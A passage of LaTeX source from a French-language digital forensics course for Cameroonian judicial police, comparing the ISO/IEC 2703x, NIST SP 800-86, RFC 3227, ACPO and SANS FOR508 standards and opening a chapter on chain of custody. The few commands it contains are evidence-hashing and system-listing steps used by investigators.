    \tableauHeader{Ph.3\\Analyt.} &
    \tableauHeader{Ph.4--5\\Form.}
}
\norme{ISO/IEC 27037} & $\bullet$ & $\bullet\bullet\bullet$ & & \\
\norme{ISO/IEC 27041} & & $\bullet$ & $\bullet\bullet$ & \\
\norme{ISO/IEC 27042} & & & $\bullet\bullet\bullet$ & \\
\norme{ISO/IEC 27043} & $\bullet$ & $\bullet$ & $\bullet$ & $\bullet$ \\
\norme{NIST SP 800-86} & $\bullet$ & $\bullet\bullet$ & $\bullet\bullet$ & $\bullet$ \\
\norme{RFC 3227} & & $\bullet\bullet\bullet$ & & \\
ACPO Guide & $\bullet$ & $\bullet\bullet$ & $\bullet$ & $\bullet$ \\
SANS FOR508 & $\bullet\bullet$ & $\bullet$ & $\bullet\bullet$ & $\bullet$ \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~7.2 --- Correspondance standards / phases PIU~:
$\bullet$ pertinent~; $\bullet\bullet$ central~; $\bullet\bullet\bullet$ définitoire}
\end{center}

% ============================================================================
\section{DFRWS~: la Fondation Conceptuelle (2001)}
\label{sec:dfrws}
% ============================================================================

Le \termecle{Digital Forensics Research Workshop}\index{DFRWS} publie en 2001
le premier cadre formel de forensique numérique. Son importance est
fondatrice~: il établit un vocabulaire commun et une séquence logique que
tous les standards suivants reprendront et affineront.

\subsection{Les six phases DFRWS}

\begin{figure}[H]
\centering
\begin{tikzpicture}[
    box/.style={draw=CouleurPrimaire, fill=CouleurDef,
        rounded corners=3pt, minimum width=2.5cm, minimum height=0.9cm,
        font=\small\bfseries\color{CouleurPrimaire}, align=center},
    fl/.style={-{Stealth[length=4pt]}, thick, color=CouleurSecondaire}
]
\node[box] (id)   at (0,0)    {Identifi-\\cation};
\node[box] (pr)   at (2.7,0)  {Préser-\\vation};
\node[box] (co)   at (5.4,0)  {Collec-\\tion};
\node[box] (ex)   at (8.1,0)  {Examina-\\tion};
\node[box] (an)   at (5.4,-1.8) {Analyse};
\node[box] (pe)   at (2.7,-1.8) {Présen-\\tation};
\draw[fl] (id) -- (pr);
\draw[fl] (pr) -- (co);
\draw[fl] (co) -- (ex);
\draw[fl] (ex) -- (an);
\draw[fl] (an) -- (pe);
% Correspondance PIU
\node[font=\tiny\itshape, color=CouleurSecondaire] at (0,-0.9) {PIU~E1--E3};
\node[font=\tiny\itshape, color=CouleurSecondaire] at (2.7,-0.9) {PIU~E4--E5};
\node[font=\tiny\itshape, color=CouleurSecondaire] at (5.4,-0.9) {PIU~E4};
\node[font=\tiny\itshape, color=CouleurSecondaire] at (8.1,-0.9) {PIU~E7--E9};
\node[font=\tiny\itshape, color=CouleurSecondaire] at (5.4,-2.7) {PIU~E9--E10};
\node[font=\tiny\itshape, color=CouleurSecondaire] at (2.7,-2.7) {PIU~E12--E13};
\end{tikzpicture}
\caption{Les 6~phases DFRWS et leurs correspondances avec le PIU}
\label{fig:dfrws}
\end{figure}

\begin{boxdef}
\textbf{Identification}~: reconnaître l'existence d'un incident numérique
et en définir le périmètre. \textbf{Préservation}~: protéger les preuves
de toute altération --- phase la plus critique, car une erreur ici est
irréparable. \textbf{Collection}~: acquérir les preuves selon des méthodes
documentées. \textbf{Examination}~: extraire les informations pertinentes.
\textbf{Analyse}~: corréler et reconstruire les événements.
\textbf{Presentation}~: communiquer les conclusions de façon défendable.
\end{boxdef}

\subsection{Limite historique du DFRWS et apport du PIU}

Le modèle DFRWS est \textbf{linéaire}. En pratique, la Phase~3
(\textit{Collection}) et la Phase~4 (\textit{Examination}) s'entrelacent~:
chaque artefact découvert lors de l'examen peut déclencher une nouvelle
collecte. Le PIU formalise cette réalité avec la boucle itérative
E4--E6~$\leftrightarrow$~E7--E10. Le DFRWS reste la référence conceptuelle~;
le PIU est l'implémentation opérationnelle.

% ============================================================================
\section{La Suite ISO/IEC 2703x~: le Standard International de Référence}
\label{sec:iso-2703x}
% ============================================================================

\subsection{Architecture de la famille}

La famille ISO/IEC~2703x constitue l'architecture normative la plus complète
et la plus internationalement reconnue pour la forensique numérique. Ses
quatre normes couvrent l'intégralité du cycle de vie des preuves numériques.

% ---- ISO 27037 ----
\subsection{ISO/IEC~27037:2012 --- Identification, Collecte et Préservation}

\norme{ISO/IEC~27037:2012} --- \textit{Guidelines for identification,
collection, acquisition and preservation of digital evidence} ---
est \textbf{le standard le plus important pour le travail de terrain}.
Son apport central est la définition de deux rôles distincts et de quatre
principes fondamentaux.

\subsubsection*{Les deux rôles}

\begin{itemize}
    \item \textbf{DEFR} (\textit{Digital Evidence First Responder})~:
          le premier intervenant sur la scène. Son rôle est la préservation
          initiale. Son erreur est irréparable. C'est l'OPJ qui arrive le
          premier dans l'affaire MBONGO.
    \item \textbf{DES} (\textit{Digital Evidence Specialist})~:
          l'analyste en laboratoire. Il reçoit les preuves préservées par
          le DEFR et conduit l'examination et l'analysis.
\end{itemize}

\subsubsection*{Les quatre principes ISO~27037}

\begin{enumerate}
    \item \textbf{Pertinence}~: la collecte doit être ciblée et justifiée.
          Ne collecter que ce qui est pertinent pour l'investigation.
    \item \textbf{Fiabilité}~: les méthodes utilisées doivent être
          reproductibles et vérifiables.
    \item \textbf{Suffisance}~: la collecte doit être exhaustive dans
          le périmètre défini. Pas de lacunes qui permettraient de contester
          la représentativité de la base probatoire.
    \item \textbf{Documentation}~: traçabilité complète de chaque action.
\end{enumerate}

\subsubsection*{Procédure de saisie selon ISO~27037}

\begin{lstlisting}[language=bash_forensique,
    caption={Checklist de saisie ISO~27037 --- séquence minimale}]
# Étape 1 — Identification préliminaire
# Type de dispositif, état (allumé/éteint), connexions actives
# -> Appliquer l'ordre de volatilité RFC 3227 (cf. section suivante)

# Étape 2 — Documentation photographique
# Photos du contexte avant toute manipulation
# Horodatage visible (montre + journal de bord)

# Étape 3 — Isolation du dispositif
# Mobile : mode avion ou sac de Faraday
# PC allumé : capturer RAM avant isolation réseau

# Étape 4 — Acquisition (write-blocker obligatoire)
# FTK Imager : File -> Create Disk Image -> Format E01
# Vérifier que le write-blocker est actif avant montage

# Étape 5 — Vérification d'intégrité (hash SHA-256 minimum)
sha256sum /dev/sdb > hash_source.txt  # Linux
certutil -hashfile image.E01 SHA256   # Windows
# Conserver les deux hash dans le formulaire custody

# Étape 6 — Scellement et transport
# Sachet inviolable, étiquette, formulaire custody signé
\end{lstlisting}

\begin{boxjuris}
\textbf{Compatibilité ISO/IEC~27037 et droit camerounais~:}

Les articles~52--59 de la \loicam{2010/012} imposent~: présence des parties,
copie réalisée en leur présence, documentation. Ces exigences sont
\textbf{substantiellement alignées} sur ISO/IEC~27037. Un investigateur
respectant le standard international respecte de facto le droit camerounais.
Inversement, une investigation conforme aux articles~52--59 satisfait
aux critères DEFR d'ISO/IEC~27037.
\end{boxjuris}

% ---- ISO 27041 ----
\subsection{ISO/IEC~27041:2015 --- Validation des Méthodes}

\norme{ISO/IEC~27041:2015} --- \textit{Guidance on assuring suitability and
adequacy of incident investigative method} --- répond à la question~:
\emph{comment s'assurer qu'une méthode d'investigation est scientifiquement
valide~?} Ce standard est particulièrement important pour l'opposabilité~:
il fournit le cadre pour justifier le choix d'un outil ou d'une technique
devant un tribunal.

Quatre domaines de méthodes validées~:
\begin{itemize}
    \item \textbf{Live Forensics}~: investigation sur système en cours
          d'exécution~; méthode conforme à RFC~3227.
    \item \textbf{Dead Forensics}~: investigation sur système éteint~;
          méthode conforme à NIST~SP~800-86.
    \item \textbf{Network Forensics}~: capture et analyse de trafic~;
          standards IETF (RFC~3227).
    \item \textbf{Mobile Forensics}~: quatre niveaux d'acquisition~;
          NIST~SP~800-101r1.
\end{itemize}

% ---- ISO 27042 ----
\subsection{ISO/IEC~27042:2015 --- Analyse et Interprétation}

\norme{ISO/IEC~27042:2015} --- \textit{Guidelines for the analysis and
interpretation of digital evidence} --- est le standard de la Phase~3 du PIU.
Son apport clé est la formalisation de la séquence d'analyse~:

\begin{enumerate}
    \item \textbf{Préparation}~: environnement d'analyse isolé, outils
          validés et versionnés.
    \item \textbf{Extraction}~: récupération des données depuis les
          images forensiques.
    \item \textbf{Analyse}~: application des techniques appropriées.
    \item \textbf{Interprétation}~: contextualisation~; c'est ici que
          la distinction constatation/interprétation s'applique.
    \item \textbf{Rapport}~: documentation rigoureuse des découvertes,
          des méthodes utilisées et des limitations.
\end{enumerate}

ISO~27042 renforce ce que le PIU appelle E9bis (falsification active)~:
le standard impose de \textbf{tester les conclusions alternatives avant
de les rejeter}, pas simplement de choisir l'explication la plus probable.

% ---- ISO 27043 ----
\subsection{ISO/IEC~27043:2015 --- Principes et Processus Intégrés}

\norme{ISO/IEC~27043:2015} est le standard de niveau le plus élevé~:
il intègre les trois précédents dans un processus complet incluant la
\termecle{readiness} (préparation pré-incident) et la gestion
post-investigation. Sa représentation canonique~:

\begin{figure}[H]
\centering
\begin{tikzpicture}[
    ph/.style={draw=CouleurSecondaire, fill=CouleurDef, rounded corners=3pt,
        font=\footnotesize\bfseries\color{CouleurPrimaire}, align=center,
        minimum height=0.8cm, inner xsep=4pt},
    fl/.style={-{Stealth[length=4pt]}, thick, color=CouleurSecondaire}
]
\node[ph, minimum width=2.0cm] (r) at (0,0) {Readiness};
\node[ph, minimum width=1.8cm] (d) at (2.2,0) {Detection};
\node[ph, minimum width=2.0cm] (ir) at (4.3,0) {Initial\\Response};
\node[ph, minimum width=1.8cm] (st) at (6.3,0) {Strategy};
\node[ph, minimum width=1.8cm] (c) at (0,-1.5) {Collection};
\node[ph, minimum width=1.8cm] (an) at (2.2,-1.5) {Analysis};
\node[ph, minimum width=2.0cm] (pr) at (4.3,-1.5) {Presentation};
\node[ph, minimum width=2.4cm] (pi) at (6.3,-1.5) {Post-Investigation};
\draw[fl] (r) -- (d);
\draw[fl] (d) -- (ir);
\draw[fl] (ir) -- (st);
\draw[fl] (st) -- (c);
\draw[fl] (c) -- (an);
\draw[fl] (an) -- (pr);
\draw[fl] (pr) -- (pi);
% Retours possibles
\draw[fl, dashed, color=CouleurAccent]
    (an.south) to[bend right=20]
    node[below, font=\tiny\itshape, color=CouleurAccent] {besoin supplémentaire}
    (c.south);
\end{tikzpicture}
\caption{Processus ISO/IEC~27043~: 8~phases avec boucle retour}
\label{fig:iso27043}
\end{figure}

% ============================================================================
\section{NIST SP~800-86~: Forensique et Réponse aux Incidents}
\label{sec:nist-800-86}
% ============================================================================

\norme{NIST SP~800-86} --- \textit{Guide to Integrating Forensic Techniques
into Incident Response} --- est la référence américaine. Sa contribution
distinctive par rapport aux normes ISO est l'\textbf{intégration de la
forensique dans la réponse aux incidents}~: le NIST ne traite pas la
forensique comme une activité autonome mais comme une composante de la
gestion des incidents de sécurité.

\subsection{Les quatre phases NIST}

\begin{tableaucours}{p{2.8cm}p{4.5cm}p{4.0cm}}{%
    \tableauHeader{Phase NIST} &
    \tableauHeader{Activités} &
    \tableauHeader{Correspondance PIU}
}
Collection & Priorisation des données~; préservation~; chaîne de custody &
    E4--E5 (Acquisition) \\
Examination & Extraction des données~; revue manuelle~; analyse automatisée &
    E7--E8 (Investigation) \\
Analysis & Reconstruction de la chronologie~; corrélation~; attribution &
    E9--E10 (Investigation analytique) \\
Reporting & Synthèse exécutive~; détails techniques~; recommandations &
    E11--E12 (Formalisation) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~7.3 --- Phases NIST SP~800-86
et correspondances PIU}\end{center}

\subsection{Distinction Examination / Analysis~: règle d'or du rapport}

La contribution épistémologique la plus importante du NIST~SP~800-86 est la
séparation stricte entre~:
\begin{itemize}
    \item \textbf{Examination}~: documenter ce qu'on \emph{trouve}.
          Résultats factuels, vérifiables, non ambigus. \emph{Exemple~:}
          « Le fichier \texttt{enc\_all.ps1} est présent dans
          \texttt{\%TEMP\%} avec un horodatage de création le
          12/03/2026~à~02h17. »
    \item \textbf{Analysis}~: interpréter ce que cela \emph{signifie}.
          Conclusions raisonnées, avec niveau de certitude explicite.
          \emph{Exemple~:} « La présence de ce script à cet horodatage,
          corrélée avec la connexion RDP de 02h14, indique \emph{avec
          une haute confiance} que le script a été déposé par l'attaquant
          lors de sa connexion. »
\end{itemize}

\begin{boxalert}
\textbf{Un avocat peut attaquer une interprétation~; il ne peut pas attaquer
un hash qui correspond.} Séparer strictement les deux types d'énoncés dans
le rapport est la protection la plus efficace contre les attaques méthodologiques
en contre-interrogatoire.
\end{boxalert}

% ============================================================================
\section{RFC~3227~: l'Ordre de Volatilité}
\label{sec:rfc3227}
% ============================================================================

La RFC~3227 (\textit{Guidelines for Evidence Collection and Archiving},
Brezinski \& Killalea, 2002) est la référence technique pour l'ordre de
collecte sur les systèmes en cours d'exécution. Elle complète ISO~27037
en précisant la \textbf{priorité de collecte selon la volatilité des données}.

\subsection{L'ordre de volatilité canonique}

\begin{tableaucours}{p{0.8cm}p{4.5cm}p{6.0cm}}{%
    \tableauHeader{Rang} &
    \tableauHeader{Type de données} &
    \tableauHeader{Durée de vie et outil}
}
1 & Registres CPU, cache &
    Nanosecondes~; non capturable en pratique \\
2 & Mémoire système (RAM) &
    Jusqu'à extinction~; FTK~Imager Portable (\texttt{Capture Memory}) \\
3 & État réseau (tables de routage, ARP, connexions) &
    Secondes à minutes~; \texttt{netstat -ano}, \texttt{arp -a} \\
4 & Processus en cours d'exécution &
    Minutes~; \texttt{tasklist} (Windows) ou \texttt{ps aux} (Linux) \\
5 & Fichiers temporaires, logs actifs &
    Heures~; \texttt{dir /T} ou \texttt{ls -lt /tmp} \\
6 & Disque dur (système de fichiers) &
    Mois à années~; FTK~Imager (image E01 avec hash) \\
7 & Logs système distants &
    Jours à semaines selon rotation~; réquisition opérateur \\
8 & Configuration physique, topologie réseau &
    Stables~; documentés en dernier \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~7.4 --- Ordre de volatilité RFC~3227}
avec outils de collecte}\end{center}

\begin{boxPNC}
\textbf{Application OPJ~: règle mnémotechnique RFC~3227}

\textbf{Sur un système allumé~: RAM avant disque, réseau avant fichiers.}

Arrivée sur la scène~: (1)~capturer la mémoire RAM en premier
(\volatilite{2}{RAM})~; (2)~documenter les connexions réseau
(\volatilite{3}{Réseau})~; (3)~lister les processus actifs
(\volatilite{4}{Processus})~; (4)~éteindre proprement~;
(5)~acquérir le disque avec write blocker
(\volatilite{6}{Disque}).

Sur un système éteint~: passer directement à l'étape~(5).
Ne jamais allumer un système éteint sans write blocker actif.
\end{boxPNC}

% ============================================================================
\section{Les Quatre Principes ACPO~: Responsabilité et Déontologie}
\label{sec:acpo}
% ============================================================================

Le guide ACPO (\textit{Association of Chief Police Officers}, Royaume-Uni,
2012) est la référence déontologique mondiale pour les forces de l'ordre.
Son importance tient à sa simplicité~: quatre principes mémorables qui
encadrent toute l'activité forensique policière.

\begin{tableaucours}{p{2.2cm}p{9.5cm}}{%
    \tableauHeader{Principe} &
    \tableauHeader{Formulation et implications}
}
\textbf{Principe~1} & \textbf{Aucune action ne doit modifier les données.}
    Toute opération de collecte doit laisser les données originales intactes.
    Fondement du write blocker, du calcul de hash et du travail sur copies. \\
\textbf{Principe~2} & \textbf{Si une modification est nécessaire,
    elle requiert la compétence technique et doit être documentée.}
    Un OPJ non formé ne doit pas procéder à l'acquisition~: il appellera
    un spécialiste. Toute modification est explicitement justifiée. \\
\textbf{Principe~3} & \textbf{Un audit trail complet doit être maintenu.}
    Chaque action, chaque accès, chaque transfert est documenté. C'est la
    traduction procédurale de la chaîne de custody. \\
\textbf{Principe~4} & \textbf{Le responsable de l'investigation est
    responsable de la conformité.} L'investigateur en chef endosse personnellement
    la responsabilité du respect de ces principes pour l'ensemble de l'équipe. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~7.5 --- Les quatre principes ACPO}
\end{center}

\begin{boxCRO}
\textbf{Analyse CRO --- Principes ACPO}

Les principes ACPO maximisent $\mathcal{R}$ et $\mathcal{O}$ au détriment
partiel de la flexibilité opérationnelle~: ils imposent une rigueur absolue
même dans les situations d'urgence. Cette tension est délibérée~: dans
le contexte policier, la $\mathcal{O}$ doit primer pour que les preuves
collectées mènent à des condamnations incontestables.

Le Principe~4 (responsabilité personnelle) est la réponse institutionnelle
au problème d'attribution~: quand la chaîne est violée, il doit être possible
d'identifier précisément qui est responsable.

\cro{$\sim$}{$\uparrow\uparrow$}{$\uparrow\uparrow$}
\end{boxCRO}

% ============================================================================
\section{SANS FOR508~: Forensique d'Entreprise et Threat Hunting}
\label{sec:sans-for508}
% ============================================================================

Le cours \norme{SANS FOR508} (\textit{Advanced Incident Response, Threat Hunting,
and Digital Forensics}) représente l'état de l'art de la forensique
d'entreprise. Contrairement aux normes ISO qui s'appliquent à tous les
contextes, FOR508 cible spécifiquement les investigations à grande échelle
sur des réseaux d'entreprise compromis.

\subsection{La méthodologie en six phases}

\begin{enumerate}
    \item \textbf{Preparation}~: plan de réponse aux incidents, validation des
          outils, formation de l'équipe~;
    \item \textbf{Identification}~: développement des IoC
          (\textit{Indicators of Compromise}), intégration de la Threat
          Intelligence, détection d'anomalies~;
    \item \textbf{Containment}~: isolation à court terme, planification
          de l'éradication, préservation des preuves~;
    \item \textbf{Eradication}~: suppression du malware, correction des
          vulnérabilités, durcissement des systèmes~;
    \item \textbf{Recovery}~: restauration des systèmes, surveillance
          renforcée, tests de validation~;
    \item \textbf{Lessons Learned}~: revue post-incident, amélioration des
          processus, mise à jour de la documentation.
\end{enumerate}

\subsection{Apports distinctifs de FOR508 en 2025}

\begin{itemize}
    \item \textbf{Forensique mémoire avec Volatility~3}~: syntaxe mise à
          jour (\texttt{python3 vol.py -f mem.dmp windows.pslist}),
          nouveaux plugins pour artefacts modernes.
    \item \textbf{EDR Forensics}~: exploitation des journaux produits par les
          outils de détection/réponse sur les endpoints (CrowdStrike, SentinelOne)~;
          souvent plus complets que les logs Windows natifs.
    \item \textbf{Enterprise-scale IR}~: investigation simultanée sur
          des centaines de machines avec des outils comme Velociraptor ou KAPE.
    \item \textbf{Threat Hunting}~: recherche proactive de compromissions
          latentes \emph{avant} qu'une alerte soit déclenchée.
\end{itemize}

\begin{boiteRemarque}{SANS FOR508 vs ISO~27037~: quelle différence~?}
ISO~27037 est un standard \emph{normatif}~: il définit ce que vous devez faire.
SANS FOR508 est un cours \emph{opérationnel}~: il vous apprend à le faire.
FOR508 va beaucoup plus loin dans les techniques spécifiques~; ISO~27037 a
une portée légale internationale. En pratique, un bon investigateur maîtrise
les deux~: la légitimité normative (ISO) et les techniques avancées (SANS).
\end{boiteRemarque}

% ============================================================================
\section{Analyse Comparative~: le Framework DICES Appliqué}
\label{sec:comparaison-dices}
% ============================================================================

\subsection{Grille comparative DICES des standards}

Chaque standard peut être analysé selon les cinq axes DICES
(\textbf{D}octrine, \textbf{I}nfrastructure, \textbf{C}apacités,
\textbf{E}cosystème, \textbf{S}tratégie)~:

\begin{tableaucours}{p{2.8cm}p{2.2cm}p{2.0cm}p{2.2cm}p{2.5cm}}{%
    \tableauHeader{Standard} &
    \tableauHeader{Doctrine} &
    \tableauHeader{Public cible} &
    \tableauHeader{Portée légale} &
    \tableauHeader{Spécialité forensique}
}
\norme{ISO/IEC 27037} & Collecte terrain & DEFR / DES &
    Internationale & Acquisition et préservation \\
\norme{ISO/IEC 27042} & Analyse & DES & Internationale & Analyse et interprétation \\
\norme{ISO/IEC 27043} & Processus global & Toute équipe &
    Internationale & Cycle de vie complet \\
\norme{NIST SP 800-86} & IR intégrée & CISO, équipe SOC &
    USA + adopté monde & IR + forensique \\
\norme{RFC 3227} & Volatilité & Tout OPJ &
    Universelle & Ordre de collecte \\
ACPO Guide & Déontologie & Forces de l'ordre &
    Nationale + influence & Principes éthiques \\
SANS FOR508 & Technique avancée & Senior analyste &
    Formation privée & Forensique entreprise \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~7.6 --- Analyse DICES comparative des standards}
\end{center}

\subsection{Quel standard pour quelle situation~?}

\begin{tableaucours}{p{5.5cm}p{5.5cm}}{%
    \tableauHeader{Situation} &
    \tableauHeader{Standard(s) prioritaire(s)}
}
OPJ arrive sur une scène, matériel allumé &
    RFC~3227 (ordre de collecte) + ISO~27037 (procédure) \\
Analyse d'une image forensique en laboratoire &
    ISO~27041 (méthode) + ISO~27042 (analyse) \\
Investigation d'un incident ransomware en entreprise &
    NIST~SP~800-86 + SANS~FOR508 \\
Expert judiciaire devant un tribunal &
    ISO~27037 + ACPO Principe~3 + NIST~SP~800-86 (rapport) \\
Investigation impliquant un État partenaire Budapest &
    ISO~27043 + Convention Budapest art.~29 (conservation) \\
Formation d'un OPJ camerounais niveau débutant &
    ACPO 4~principes + RFC~3227 (ordre volatilité) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~7.7 --- Sélection du standard selon la situation}
\end{center}

% ============================================================================
\section{Standards Émergents~: Cloud, IoT et Post-Quantique}
\label{sec:standards-emergents}
% ============================================================================

\subsection{Forensique cloud}

\begin{itemize}
    \item \norme{ISO/IEC~27050}~: \textit{Electronic Discovery}~;
          collecte de données électroniques pour procédures légales,
          incluant les environnements cloud.
    \item \norme{NIST SP~800-210}~: Cloud forensics challenges~;
          gestion des défis multitenancy, éphéméralité et multi-juridiction.
    \item \textbf{CSA Guidelines}~: Cloud Security Alliance,
          bonnes pratiques d'investigation dans les environnements cloud.
\end{itemize}

\subsection{Forensique IoT}

\begin{itemize}
    \item \norme{IEEE~P2933}~: Trusted IoT Data~;
          authenticité et intégrité des données produites par des objets connectés.
    \item \norme{ETSI TR~103~939}~: IoT testing methodology.
    \item \norme{ISO/IEC~30141}~: IoT reference architecture~;
          utile pour comprendre où trouver les données forensiques.
\end{itemize}

\subsection{Post-quantique et authenticité des preuves}

Le NIST finalise en 2024 les algorithmes post-quantiques de signature~:
\norme{CRYSTALS-Dilithium}, \norme{FALCON} et \norme{SPHINCS+}. Ces
algorithmes remplaceront à terme ECDSA et RSA pour la signature
cryptographique des preuves numériques. L'enjeu forensique~: les preuves
signées aujourd'hui avec ECDSA seront potentiellement cassables dans 10--15~ans.
Pour les affaires à longue durée (\textit{e.g.} terrorisme), la migration
vers les algorithmes post-quantiques est déjà une obligation éthique.

\begin{boxCRO}
\textbf{Analyse CRO --- Standards et choix méthodologique}

Le choix d'un standard n'est pas neutre vis-à-vis du Trilemme CRO~:

$\mathcal{R}$ (Fiabilité) est maximisée par les standards techniques~:
RFC~3227 (ordre de collecte), ISO~27037 (hash), ISO~27042 (méthodes validées).

$\mathcal{O}$ (Opposabilité) est maximisée par les standards à portée légale~:
ISO~27037 et ACPO sont reconnus par les tribunaux du monde entier~;
NIST~SP~800-86 est reconnu aux USA et dans de nombreux pays.

$\mathcal{C}$ (Confidentialité) est gérée par les standards procéduraux~:
ACPO Principe~1 (ne pas modifier) protège les données des parties~;
ISO~27041 (proportionnalité de la collecte) évite la sur-collecte.

\cro{$\uparrow$ ACPO Pr.1}{$\uparrow\uparrow$ ISO 27037/42}{$\uparrow\uparrow$ ISO 27037/ACPO}
\end{boxCRO}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item Les standards forensiques résolvent trois problèmes~:
          \textbf{interopérabilité} (preuves recevables partout),
          \textbf{opposabilité} (méthode défendable) et \textbf{formation}
          (base commune).

    \item \textbf{Pour le terrain~:} RFC~3227 (ordre de volatilité~:
          RAM $\to$ réseau $\to$ processus $\to$ disque) et ISO~27037
          (procédure de saisie, rôles DEFR/DES, hash SHA-256 minimum).

    \item \textbf{Pour l'analyse~:} ISO~27042 impose la séquence
          Préparation~$\to$ Extraction~$\to$ Analyse~$\to$ Interprétation~$\to$
          Rapport~; la distinction Examination/Analysis (NIST~SP~800-86)
          est la règle d'or du rapport forensique.

    \item \textbf{Pour la déontologie~:} ACPO 4~principes --- (1)~ne
          pas modifier~; (2)~compétence si modification~; (3)~audit trail~;
          (4)~responsabilité personnelle.

    \item \textbf{En droit camerounais~:} ISO~27037 est
          \textbf{substantiellement aligné} sur les articles~52--59 de la
          \loicam{2010/012}. La conformité à l'un implique la conformité
          à l'autre.

    \item \textbf{Choix situationnel~:} terrain~$\to$ RFC~3227 + ISO~27037~;
          laboratoire~$\to$ ISO~27041 + ISO~27042~; entreprise~$\to$ NIST + SANS~;
          tribunal~$\to$ ISO~27037 + ACPO~; transfrontalier~$\to$ Budapest art.~29.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~7.1 --- Sélection de standard \niveaubase}]
Pour chacune des situations suivantes, identifiez le(s) standard(s) à
appliquer en priorité et justifiez votre choix~:
\begin{enumerate}[(a)]
    \item Un OPJ camerounais arrive chez un suspect~; l'ordinateur est allumé,
          et un téléphone Android est posé sur le bureau en mode déverrouillé.
    \item Un analyste forensique doit déterminer si les 15~000~emails
          collectés dans une affaire de fraude ont été altérés depuis leur
          collecte.
    \item Une PME camerounaise victime d'un ransomware demande une investigation
          complète pour identifier l'attaquant et produire un rapport
          pour son assurance.
    \item Un expert judiciaire doit produire un rapport opposable dans
          une affaire impliquant des preuves stockées sur des serveurs
          Google (États-Unis).
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~7.2 --- Application ACPO + RFC~3227 \niveaumoyen}]
Vous intervenez dans l'affaire MVOM (Opération MVOM, Chapitre~\ref{chap:gr-affaires})~:
serveur Windows compromis par ransomware, allumé, connecté au réseau.
\begin{enumerate}[(a)]
    \item Appliquez l'ordre de volatilité RFC~3227 à cette scène spécifique~:
          listez les 6~premières actions dans l'ordre exact, en précisant
          l'outil et la commande correspondante.
    \item Pour chaque action, identifiez le principe ACPO auquel elle répond.
    \item L'analyste doit capturer la mémoire RAM (16~Go) sur un serveur
          en production. Le Principe~1 ACPO dit ``ne pas modifier les données''~;
          or la capture RAM modifie légèrement la RAM. Comment résoudre
          cette tension~? Quelle documentation apporter~?
    \item Rédigez l'entrée correspondante dans le formulaire de chaîne
          de custody (une ligne par action).
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~7.3 --- Analyse comparative DICES \niveauexpert}]
Un responsable forensique au sein de l'ANTIC doit rédiger une
\textit{note de politique forensique} recommandant les standards à adopter
officiellement au Cameroun.
\begin{enumerate}[(a)]
    \item Sur la base de l'analyse DICES, quel standard recommandez-vous
          comme fondement légal principal~? Justifiez en articulant portée
          légale, compatibilité avec la Loi~2010/012 et facilité de
          formation pour les OPJ.
    \item Identifiez deux tensions CRO que la mise en \oe uvre de ce standard
          créerait dans le contexte camerounais~; proposez une résolution
          pour chacune.
    \item La Convention de Budapest (art.~29) est complémentaire à ces
          standards~: expliquez en quoi, et dans quel cas un OPJ camerounais
          l'activerait en \emph{plus} d'ISO~27037.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:custody} approfondit la
\textbf{chaîne de custody}~: le mécanisme procédural qui traduit concrètement
ISO~27037 et les principes ACPO en documents et formulaires opposables.
C'est le chapitre le plus important pour l'admissibilité des preuves
devant les tribunaux camerounais.
\end{boxinfo}
       
        % ============================================================================
% Fichier  : partie2/P02_C08_chaine_custody.tex
% Titre    : Chaîne de Custody et Admissibilité
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : M5_Investigation_Numerique_PNC.docx (§5.4 formulaire, BLOC 2)
%            M3_Cadre_Normatif_National_PNC.docx (art. 52-59 Loi 2010/012)
%            Prologue (affaire MBONGO), Ch. PIU (E4-E6, QG2)
%            ISO/IEC 27037, ACPO 4 principes
% ============================================================================

\chapter{Chaîne de Custody et Admissibilité}
\label{chap:custody}

\epigraph{%
    « La chaîne de custody ne commence pas quand vous ouvrez Autopsy.
    Elle commence quand vous posez les yeux sur la scène de crime. »%
}{--- Principe opérationnel de la forensique judiciaire}

\niveauChapitre{Fondamental}{%
    Aucun prérequis technique. Ce chapitre est essentiellement procédural
    et juridique. Il est le plus important pour l'admissibilité des preuves
    devant les tribunaux camerounais.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Définir la \termecle{chaîne de custody} et comprendre pourquoi
          elle est la condition fondamentale de l'admissibilité d'une preuve.
    \item Maîtriser le cadre légal camerounais~: articles~52--59 de la
          \loicam{2010/012} et leurs implications procédurales concrètes.
    \item Remplir correctement le \termecle{formulaire de chaîne de custody}
          pour chaque type d'evidence (PC, mobile, serveur, cloud).
    \item Identifier et éviter les cinq erreurs de custody les plus
          fréquentes qui provoquent le rejet des preuves à l'audience.
    \item Appliquer le protocole de custody à chaque étape~:
          collecte, transport, stockage, transfert, analyse, présentation.
    \item Analyser chaque décision de custody à travers le Trilemme~CRO.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Le cas qui revient au début}
% ============================================================================

Le Prologue de ce cours s'est ouvert sur l'affaire MBONGO~: un dossier
judiciaire complet --- emails, captures d'écran, historique de navigation ---
anéanti en dix minutes d'audience parce que l'OPJ avait allumé le PC du suspect
avant de l'acquérir. Tout le travail technique était irréprochable. La chaîne
de custody était brisée.

Ce chapitre est la réponse directe à cette affaire. Il ne s'agit pas de
théorie~: chaque procédure décrite ici correspond à une erreur réelle qui
a fait rejeter une preuve numérique devant un tribunal. Lire ce chapitre,
c'est apprendre à ne pas répéter ces erreurs.

\separateur

% ============================================================================
\section{Définition et Fondements de la Chaîne de Custody}
\label{sec:custody-fondements}
% ============================================================================

\subsection{Définition formelle}

\begin{boxdef}
\textbf{Chaîne de custody}\index{chaîne de custody}
(\textit{Chain of custody, chain of evidence}) --- Document chronologique
